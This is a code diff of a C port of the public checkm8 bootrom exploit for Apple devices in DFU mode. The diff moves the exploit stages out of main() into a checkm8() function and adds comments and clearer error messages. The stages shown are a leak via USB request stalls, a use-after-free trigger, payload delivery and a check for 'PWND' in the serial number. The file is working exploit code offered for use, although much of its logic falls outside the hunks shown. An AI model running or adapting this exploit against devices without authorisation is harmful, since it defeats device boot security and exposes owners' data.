@@ -1,3 +1,8 @@
+/* 
+ * this is pretty much a direct rewrite
+ * of original checkm8 implementation from ipwndfu
+ */
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdbool.h>
@@ -5,6 +10,11 @@
 #include <unistd.h>
 #include <sys/time.h>
 
+/*
+ * XXX shouldn't this use <> brackets instead?
+ * Apparently newer Clang is forgiving?
+ * Or I don't understand something? Whatever
+ */
 #include "lilirecovery.h"
 #include "config.h"
 
@@ -89,7 +99,7 @@ irecv_client_t acquire_device(int attempts, bool need_found_report, bool need_no
     }
 
     if (!info->srtg) {
-        printf("not DFU mode\n");
+        printf("device is NOT in DFU mode\n");
         goto fail;
     }
 
@@ -113,31 +123,7 @@ fail:
     return NULL;
 }
 
-static void print_banner() {
-    printf("***          checkm8 exploit by @axi0mX           ***\n");
-    printf("*** s5l8747x/Haywire implementation by @a1exdandy ***\n");
-    printf("***     libirecovery/iOS port by @nyan_satan      ***\n");
-    printf("\n");
-}
-
-int main(void) {
-    print_banner();
-
-    const exploit_config_t *config = NULL;
-
-    irecv_client_t device = acquire_device(1, true, false, &config);
-    if (!device) {
-        return -1;
-    }
-
-    if (check_device_pwnd(device)) {
-        printf("device already pwned\n");
-        return -1;
-    }
-
-    struct timeval st, et;
-    gettimeofday(&st, NULL);
-
+int checkm8(irecv_client_t device, const exploit_config_t *config) {
     printf("leaking...\n");
 
     usb_req_stall(device);
@@ -151,6 +137,7 @@ int main(void) {
 
     device = acquire_device(10, false, true, NULL);
     if (!device) {
+        printf("device disappeared after leak stage\n");
         return -1;
     }
 
@@ -162,6 +149,7 @@ int main(void) {
 
     device = acquire_device(10, false, true, NULL);
     if (!device) {
+        printf("device disappeared after UaF trigger stage\n");
         return -1;
     }
 
@@ -190,12 +178,48 @@ int main(void) {
 
     device = acquire_device(10, true, true, NULL);
     if (!device) {
+        printf("device disappeared after sending payload\n");
         return -1;
     }
 
     if (!check_device_pwnd(device)) {
-        printf("exploit failed\n");
+        printf("device returned to DFU, but no PWND in serial number\n");
         close_device(device);
+        return -1;
+    }
+
+    close_device(device);
+
+    return 0;
+}
+
+static void print_banner() {
+    printf("***          checkm8 exploit by @axi0mX           ***\n");
+    printf("*** s5l8747x/Haywire implementation by @a1exdandy ***\n");
+    printf("***     libirecovery/iOS port by @nyan_satan      ***\n");
+    printf("\n");
+}
+
+int main(void) {
+    print_banner();
+
+    const exploit_config_t *config = NULL;
+
+    irecv_client_t device = acquire_device(1, true, false, &config);
+    if (!device) {
+        return -1;
+    }
+
+    if (check_device_pwnd(device)) {
+        printf("device already pwned\n");
+        return -1;
+    }
+
+    struct timeval st, et;
+    gettimeofday(&st, NULL);
+
+    if (checkm8(device, config) != 0) {
+        printf("exploit failed\n");
         return -1;
     }
 
